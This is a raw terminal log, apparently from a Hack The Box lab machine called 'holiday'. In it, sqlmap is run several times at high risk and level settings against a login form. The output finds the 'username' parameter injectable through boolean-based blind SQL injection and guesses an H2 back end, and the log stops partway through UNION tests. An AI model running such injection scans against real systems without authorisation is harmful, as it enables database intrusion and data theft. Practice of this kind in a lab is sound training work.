root@parrot:~/hackthebox/holiday# vi                                                                                                                             
gobuster_list  login.req      nmap/                                             
root@parrot:~/hackthebox/holiday# vi login.req                                  
root@parrot:~/hackthebox/holiday# sqlmap -r login.req --risk 3 --level 5 --threads 20                                                                            
        ___                             
       __H__                            
 ___ ___[,]_____ ___ ___  {1.3.12#stable}                                       
|_ -| . [,]     | .'| . |               
|___|_  [']_|_|_|__,|  _|               
      |_|V...       |_|   http://sqlmap.org                                     

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program                             

[*] starting @ 13:07:10 /2020-01-16/    

[13:07:10] [INFO] parsing HTTP request from 'login.req'                         
[13:07:10] [CRITICAL] maximum number of used threads is 10 avoiding potential connection issues                                                                  

[*] ending @ 13:07:10 /2020-01-16/      

root@parrot:~/hackthebox/holiday# sqlmap -r login.req --risk 3 --level 5 --threads 10                                                                            
        ___                             
       __H__                            
 ___ ___[(]_____ ___ ___  {1.3.12#stable}                                       
|_ -| . [']     | .'| . |               
|___|_  [(]_|_|_|__,|  _|               
      |_|V...       |_|   http://sqlmap.org                                     

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program                             

[*] starting @ 13:07:28 /2020-01-16/    

[13:07:28] [INFO] parsing HTTP request from 'login.req'                         
[13:07:29] [INFO] testing connection to the target URL                          
[13:07:30] [INFO] checking if the target is protected by some kind of WAF/IPS   
[13:07:30] [INFO] testing if the target URL content is stable                   
[13:07:30] [INFO] target URL content is stable                                  
[13:07:30] [INFO] testing if POST parameter 'username' is dynamic               
[13:07:31] [WARNING] POST parameter 'username' does not appear to be dynamic    
[13:07:31] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable                                                         
[13:07:32] [INFO] testing for SQL injection on POST parameter 'username'        
[13:07:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'    
[13:08:11] [WARNING] there is a possibility that the target (or WAF/IPS) is dropping 'suspicious' requests                                                       
[13:08:11] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)                                                            
[13:08:11] [WARNING] if the problem persists please try to lower the number of used threads (option '--threads')                                                 
[13:09:21] [WARNING] user aborted during detection phase                        
how do you want to proceed? [(S)kip current test/(e)nd detection phase/(n)ext parameter/(c)hange verbosity/(q)uit] q                                             
[13:09:25] [ERROR] user quit            

[*] ending @ 13:09:25 /2020-01-16/      

root@parrot:~/hackthebox/holiday# sqlmap -r login.req --risk 3 --level 5 --threads 8                                                                             
        ___                             
       __H__                            
 ___ ___[,]_____ ___ ___  {1.3.12#stable}                                       
|_ -| . [(]     | .'| . |               
|___|_  [,]_|_|_|__,|  _|               
      |_|V...       |_|   http://sqlmap.org                                     

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program                             

[*] starting @ 13:09:56 /2020-01-16/    

[13:09:56] [INFO] parsing HTTP request from 'login.req'                         
[13:09:56] [INFO] testing connection to the target URL                          
[13:09:57] [INFO] testing if the target URL content is stable                   
[13:09:57] [INFO] target URL content is stable                                  
[13:09:57] [INFO] testing if POST parameter 'username' is dynamic               
[13:09:57] [WARNING] POST parameter 'username' does not appear to be dynamic    
[13:09:57] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable                                                         
[13:09:58] [INFO] testing for SQL injection on POST parameter 'username'        
[13:09:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'    
[13:10:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'     
[13:10:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'                                                                                
[13:10:58] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable (with --string="Invalid User")      
[13:10:59] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'H2'                                                                           
it looks like the back-end DBMS is 'H2'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y                                                    
[13:11:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'        
[13:11:45] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found            
[13:11:52] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'                                                                                
[13:12:24] [WARNING] there is a possibility that the target (or WAF/IPS) is dropping 'suspicious' requests                                                       
[13:12:24] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)                                                            
[13:12:24] [WARNING] if the problem persists please try to lower the number of used threads (option '--threads')                                                 
[13:13:10] [WARNING] user aborted during detection phase                        
how do you want to proceed? [(S)kip current test/(e)nd detection phase/(n)ext parameter/(c)hange verbosity/(q)uit] q                                             
[13:13:13] [ERROR] user quit            

[*] ending @ 13:13:13 /2020-01-16/      

root@parrot:~/hackthebox/holiday# sqlmap -r login.req --risk 3 --level 5 --tables                                                                                
        ___                             
       __H__                            
 ___ ___[,]_____ ___ ___  {1.3.12#stable}                                       
|_ -| . [.]     | .'| . |               
|___|_  ["]_|_|_|__,|  _|               
      |_|V...       |_|   http://sqlmap.org                                     

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program                             

[*] starting @ 13:14:09 /2020-01-16/    

[13:14:09] [INFO] parsing HTTP request from 'login.req'                         
[13:14:09] [INFO] testing connection to the target URL                          
[13:14:10] [INFO] testing if the target URL content is stable                   
[13:14:10] [INFO] target URL content is stable                                  
[13:14:10] [INFO] testing if POST parameter 'username' is dynamic               
[13:14:11] [WARNING] POST parameter 'username' does not appear to be dynamic    
[13:14:11] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable                                                         
[13:14:11] [INFO] testing for SQL injection on POST parameter 'username'        
[13:14:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'    
[13:14:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'     
[13:15:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'                                                                                
[13:15:21] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable (with --string="Invalid User")      
[13:15:22] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'H2'                                                                           
it looks like the back-end DBMS is 'H2'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n                                                    
[13:15:30] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                          
[13:15:31] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'                                                               
[13:15:31] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                                      
[13:15:31] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'                                                                           
[13:15:32] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                              
[13:15:32] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'                                                                   
[13:15:33] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                    
[13:15:33] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                     
[13:15:33] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                             
[13:15:33] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                              
[13:15:34] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'                                                
[13:15:34] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'                                                 
[13:15:34] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                    
[13:15:35] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'                                                                         
[13:15:35] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'                                                                                
[13:15:35] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause' 
[13:15:35] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'  
[13:15:36] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'                                                            
[13:15:36] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)'                                                             
[13:15:36] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'                                                       
[13:15:37] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)'                                                        
[13:15:37] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'                                                        
[13:15:37] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)'                                                         
[13:15:37] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'                                                                            
[13:15:38] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (XMLType)'                                                                             
[13:15:38] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'                                                        
[13:15:38] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)'                                                         
[13:15:38] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'                                                                  
[13:15:39] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'                                                                   
[13:15:39] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)'                                                      
[13:15:39] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)'                                                       
[13:15:39] [INFO] testing 'Firebird AND error-based - WHERE or HAVING clause'   
[13:15:40] [INFO] testing 'Firebird OR error-based - WHERE or HAVING clause'    
[13:15:40] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'                                                                          
[13:15:40] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'                                                                       
[13:15:40] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'  
[13:15:40] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'                                                                           
[13:15:40] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[13:15:40] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'                                                                             
[13:15:40] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'                                                                          
[13:15:40] [INFO] testing 'PostgreSQL error-based - Parameter replace'          
[13:15:40] [INFO] testing 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)'                                                                         
[13:15:40] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'                                                                          
[13:15:40] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)'                                                         
[13:15:40] [INFO] testing 'Oracle error-based - Parameter replace'              
[13:15:40] [INFO] testing 'Firebird error-based - Parameter replace'            
[13:15:40] [INFO] testing 'MySQL inline queries'                                
[13:15:41] [INFO] testing 'PostgreSQL inline queries'                           
[13:15:41] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'          
[13:15:41] [INFO] testing 'Oracle inline queries'                               
[13:15:42] [INFO] testing 'SQLite inline queries'                               
[13:15:42] [INFO] testing 'Firebird inline queries'                             
[13:15:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'           
[13:15:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries'                     
[13:15:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'                                                                              
[13:15:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'       
[13:15:43] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'                                                                               
[13:15:44] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'        
[13:15:44] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'          
[13:15:44] [INFO] testing 'PostgreSQL > 8.1 stacked queries'                    
[13:15:45] [INFO] testing 'PostgreSQL stacked queries (heavy query - comment)'  
[13:15:45] [INFO] testing 'PostgreSQL stacked queries (heavy query)'            
[13:15:46] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc - comment)'  
[13:15:46] [INFO] testing 'PostgreSQL < 8.2 stacked queries (Glibc)'            
[13:15:47] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'                                                                                
[13:15:47] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)'                                                                      
[13:15:47] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'         
[13:15:47] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (DECLARE)'                                                                                
[13:15:48] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'                                                                         
[13:15:48] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)'  
[13:15:49] [INFO] testing 'Oracle stacked queries (heavy query - comment)'      
[13:15:49] [INFO] testing 'Oracle stacked queries (heavy query)'                
[13:15:49] [INFO] testing 'Oracle stacked queries (DBMS_LOCK.SLEEP - comment)'  
[13:15:50] [INFO] testing 'Oracle stacked queries (DBMS_LOCK.SLEEP)'            
[13:15:50] [INFO] testing 'Oracle stacked queries (USER_LOCK.SLEEP - comment)'  
[13:15:50] [INFO] testing 'Oracle stacked queries (USER_LOCK.SLEEP)'            
[13:15:50] [INFO] testing 'IBM DB2 stacked queries (heavy query - comment)'     
[13:15:50] [INFO] testing 'IBM DB2 stacked queries (heavy query)'               
[13:15:50] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[13:15:51] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'          
[13:15:51] [INFO] testing 'Firebird stacked queries (heavy query - comment)'    
[13:15:51] [INFO] testing 'Firebird stacked queries (heavy query)'              
[13:15:52] [INFO] testing 'SAP MaxDB stacked queries (heavy query - comment)'   
[13:15:52] [INFO] testing 'SAP MaxDB stacked queries (heavy query)'             
[13:15:53] [INFO] testing 'HSQLDB >= 1.7.2 stacked queries (heavy query - comment)'                                                                              
[13:15:53] [INFO] testing 'HSQLDB >= 1.7.2 stacked queries (heavy query)'       
[13:15:53] [INFO] testing 'HSQLDB >= 2.0 stacked queries (heavy query - comment)'                                                                                
[13:15:54] [INFO] testing 'HSQLDB >= 2.0 stacked queries (heavy query)'         
[13:15:54] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'  
[13:15:54] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'   
[13:15:54] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'        
[13:15:55] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'         
[13:15:55] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'                                                                               
[13:15:55] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'                                                                                
[13:15:55] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'                                                                         
[13:15:56] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'                                                                          
[13:15:56] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'   
[13:15:57] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query)'    
[13:15:57] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query - comment)'                                                                          
[13:15:57] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query - comment)'                                                                           
[13:15:58] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'              
[13:15:58] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'    
[13:15:58] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[13:15:59] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'                                                                       
[13:15:59] [INFO] testing 'MySQL AND time-based blind (ELT)'                    
[13:15:59] [INFO] testing 'MySQL OR time-based blind (ELT)'                     
[13:16:00] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'          
[13:16:00] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'           
[13:16:00] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'               
[13:16:01] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind'                
[13:16:01] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind (comment)'     
[13:16:01] [INFO] testing 'PostgreSQL > 8.1 OR time-based blind (comment)'      
[13:16:02] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'       
[13:16:02] [INFO] testing 'PostgreSQL OR time-based blind (heavy query)'        
[13:16:02] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'                                                                              
[13:16:03] [INFO] testing 'PostgreSQL OR time-based blind (heavy query - comment)'                                                                               
[13:16:03] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'   
[13:17:03] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF - comment)'                                                                          
[13:17:36] [WARNING] user aborted during detection phase                        
how do you want to proceed? [(S)kip current test/(e)nd detection phase/(n)ext parameter/(c)hange verbosity/(q)uit] s                                             
[13:17:48] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query)'                                                                       
[13:18:19] [INFO] testing 'Microsoft SQL Server/Sybase OR time-based blind (heavy query)'                                                                        
[13:18:20] [INFO] testing 'Microsoft SQL Server/Sybase AND time-based blind (heavy query - comment)'                                                             
[13:18:20] [INFO] testing 'Microsoft SQL Server/Sybase OR time-based blind (heavy query - comment)'                                                              
[13:18:21] [INFO] testing 'Oracle AND time-based blind'                         
[13:18:21] [INFO] testing 'Oracle OR time-based blind'                          
[13:18:22] [INFO] testing 'Oracle AND time-based blind (comment)'               
[13:18:22] [INFO] testing 'Oracle OR time-based blind (comment)'                
[13:18:22] [INFO] testing 'Oracle AND time-based blind (heavy query)'           
[13:18:23] [INFO] testing 'Oracle OR time-based blind (heavy query)'            
[13:18:23] [INFO] testing 'Oracle AND time-based blind (heavy query - comment)' 
[13:18:24] [INFO] testing 'Oracle OR time-based blind (heavy query - comment)'  
[13:18:24] [INFO] testing 'IBM DB2 AND time-based blind (heavy query)'          
[13:18:25] [INFO] testing 'IBM DB2 OR time-based blind (heavy query)'           
[13:18:25] [INFO] testing 'IBM DB2 AND time-based blind (heavy query - comment)'
[13:18:26] [INFO] testing 'IBM DB2 OR time-based blind (heavy query - comment)' 
[13:18:26] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'     
[13:18:26] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'      
[13:18:49] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)                                                               
[13:18:49] [WARNING] most likely web server instance hasn't recovered yet from previous timed based payload. If the problem persists please wait for a few minutes and rerun without flag 'T' in option '--technique' (e.g. '--flush-session --technique=BEUS') or try to lower the value of option '--time-sec' (e.g. '--time-sec=2')                                    
[13:18:50] [CRITICAL] unable to connect to the target URL ('Connection refused')
[13:18:50] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)                                        
[13:18:51] [CRITICAL] unable to connect to the target URL ('Connection refused')
[13:18:52] [CRITICAL] unable to connect to the target URL ('Connection refused'). sqlmap is going to retry the request(s)                                        
^Z                                      
[1]+  Stopped                 sqlmap -r login.req --risk 3 --level 5 --tables   
root@parrot:~/hackthebox/holiday# sqlmap -r login.req --risk 3 --level 5  --dbms=mysql                                                                           
        ___                             
       __H__                            
 ___ ___[)]_____ ___ ___  {1.3.12#stable}                                       
|_ -| . [.]     | .'| . |               
|___|_  [)]_|_|_|__,|  _|               
      |_|V...       |_|   http://sqlmap.org                                     

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program                             

[*] starting @ 13:32:48 /2020-01-16/    

[13:32:48] [INFO] parsing HTTP request from 'login.req'                         
[13:32:49] [INFO] testing connection to the target URL                          
[13:33:19] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)                                                            
[13:33:19] [WARNING] if the problem persists please check that the provided target URL is reachable. In case that it is, you can try to rerun with switch '--random-agent' and/or proxy switches ('--ignore-proxy', '--proxy',...)               
[13:34:49] [CRITICAL] connection timed out to the target URL                    
[13:34:49] [INFO] testing if the target URL content is stable                   
[13:34:57] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'                                                    
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] c              
[13:35:34] [CRITICAL] can't check dynamic content because of lack of page content                                                                                
[13:35:34] [INFO] testing if POST parameter 'username' is dynamic               
[13:35:34] [WARNING] POST parameter 'username' does not appear to be dynamic    
[13:35:34] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable                                                         
[13:35:35] [INFO] testing for SQL injection on POST parameter 'username'        
[13:35:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'    
[13:36:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'     
[13:36:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'                                                                                
[13:36:28] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable (with --string="Invalid User")      
[13:36:28] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                          
[13:36:29] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'                                                               
[13:36:29] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'                                                      
[13:36:29] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'                                                                           
[13:36:30] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'                                              
[13:36:30] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'                                                                   
[13:36:30] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                    
[13:36:31] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                     
[13:36:31] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                             
[13:36:31] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                              
[13:36:31] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'                                                
[13:36:31] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'                                                 
[13:36:32] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'                                                    
[13:36:32] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'                                                                         
[13:36:32] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'                                                                                
[13:36:32] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'                                                                          
[13:36:33] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'                                                                       
[13:36:33] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'  
[13:36:33] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'                                                                           
[13:36:33] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[13:36:33] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'                                                                             
[13:36:33] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'                                                                          
[13:36:33] [INFO] testing 'MySQL inline queries'                                
[13:36:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'           
[13:36:33] [INFO] testing 'MySQL >= 5.0.12 stacked queries'                     
[13:36:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'                                                                              
[13:36:34] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'       
[13:36:34] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'                                                                               
[13:36:34] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'        
[13:36:34] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'  
[13:36:35] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'   
[13:36:35] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'        
[13:36:35] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'         
[13:36:35] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'                                                                               
[13:36:36] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'                                                                                
[13:36:36] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'                                                                         
[13:36:36] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'                                                                          
[13:36:36] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'   
[13:36:37] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query)'    
[13:36:37] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query - comment)'                                                                          
[13:36:37] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query - comment)'                                                                           
[13:36:37] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'              
[13:36:38] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'    
[13:36:38] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[13:36:38] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'                                                                       
[13:36:38] [INFO] testing 'MySQL AND time-based blind (ELT)'                    
[13:36:39] [INFO] testing 'MySQL OR time-based blind (ELT)'                     
[13:36:39] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'          
[13:36:39] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'           
[13:36:40] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'                                                       
[13:36:40] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'                                             
[13:36:40] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[13:36:40] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'                                                                  
[13:36:40] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (heavy queries)'                                                                  
[13:36:40] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'   
[13:36:40] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'    
[13:36:40] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'                                                                                
[13:36:40] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'        
[13:36:40] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found            
[13:36:46] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'                                                                                
[13:36:51] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'       
[13:37:22] [WARNING] there is a possibility that the target (or WAF/IPS) is dropping 'suspicious' requests                                                       
[13:37:22] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)                                                            
[13:38:53] [CRITICAL] connection timed out to the target URL                    
[13:39:03] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'                                                                               
[13:39:09] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'       
[13:39:13] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'                                                                               
[13:39:18] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'       
[13:39:22] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'                                                                               
[13:39:27] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'      
